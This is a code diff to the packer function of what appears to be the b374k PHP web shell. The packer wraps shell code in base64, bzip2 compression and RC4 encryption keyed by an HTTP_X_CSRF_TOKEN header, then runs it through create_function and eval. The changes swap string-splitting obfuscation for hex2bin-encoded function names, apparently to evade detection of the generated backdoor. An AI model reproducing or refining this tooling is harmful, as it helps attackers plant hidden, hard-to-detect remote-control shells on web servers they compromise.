@@ -539,7 +539,7 @@ function packer_b374k($output, $phpcode, $htmlcode, $strip, $base64, $compress, 
 	}
 	
 	$header = "<?php\n";
-	$rc4_function = $compress=="rc4" ? 'function rc4($a,$b){$c=array();for($d=0;$d<256;$d++){$c[$d]=$d;}$e=0;for($d=0;$d<256;$d++){$e=($e+$c[$d]+ord($a[$d%strlen($a)]))%256;$f=$c[$d];$c[$d]=$c[$e];$c[$e]=$f;}$d=0;$e=0;$g="";for($h=0;$h<strlen($b);$h++){$d=($d+1)%256;$e=($e+$c[$d])%256;$f=$c[$d];$c[$d]=$c[$e];$c[$e]=$f;$g.=$b[$h]^chr($c[($c[$d]+$c[$e])%256]);}return $g;}function bds($s){$r='.'bz'.'de'.'com'.'pre'.'ss'.'($s);if(gettype($r)=="integer"){phpinfo();return "";}else{return $r;}}':'';
+	$rc4_function = $compress=="rc4" ? 'function rc4($a,$b){$c=array();for($d=0;$d<256;$d++){$c[$d]=$d;}$e=0;for($d=0;$d<256;$d++){$e=($e+$c[$d]+ord($a[$d%strlen($a)]))%256;$f=$c[$d];$c[$d]=$c[$e];$c[$e]=$f;}$d=0;$e=0;$g="";for($h=0;$h<strlen($b);$h++){$d=($d+1)%256;$e=($e+$c[$d])%256;$f=$c[$d];$c[$d]=$c[$e];$c[$e]=$f;$g.=$b[$h]^chr($c[($c[$d]+$c[$e])%256]);}return $g;}function bds($s){$r='.'bzdecompress($s);if(gettype($r)=="integer"){phpinfo();return "";}else{return $r;}}':'';
 
 
 	if($strip=='yes'){
@@ -580,7 +580,7 @@ function packer_b374k($output, $phpcode, $htmlcode, $strip, $base64, $compress, 
 		$content = base64_encode($content);
 		if($compress!='no'){
 			if($compress=="rc4") {
-				$encoder = "b'.'d'.'s(".$encoder_func."(isset(\$_SERVER[\\'HTTP_X_CSRF_TOKEN\\'])?\$_SERVER[\\'HTTP_X_CSRF_TOKEN\\']:\\'dfk\\',ba'.'se'.'64'.'_de'.'co'.'de(\$x)))";
+				$encoder = "bds(".$encoder_func."(isset(\$_SERVER[\\'HTTP_X_CSRF_TOKEN\\'])?\$_SERVER[\\'HTTP_X_CSRF_TOKEN\\']:\\'dfk\\',ba'.'se'.'64'.'_de'.'co'.'de(\$x)))";
 			} else {
 				$encoder = $encoder_func."(ba'.'se'.'64'.'_de'.'co'.'de(\$x))";
 			}
@@ -590,7 +590,7 @@ function packer_b374k($output, $phpcode, $htmlcode, $strip, $base64, $compress, 
 		}
 
 		$func = '_'.generateRandomString(4);
-		$code = $header.$password."\$cf=\"cr\".\"eat\".\"e_fun\".\"cti\".\"on\";\$".$func."=\$cf('\$x','ev'.'al'.'(\"?>\".".$encoder.");');\$".$func."(\"".$content."\");{$rc4_function}?>";
+		$code = $header.$password."\$cf=hex2bin('".bin2hex("create_function")."');\$".$func."=\$cf('\$x',hex2bin('".bin2hex("eval")."').'(\"?>\".".$encoder.");');\$".$func."(\"".$content."\");{$rc4_function}?>";
 	}
 	else{
 		if($compress!='no'){
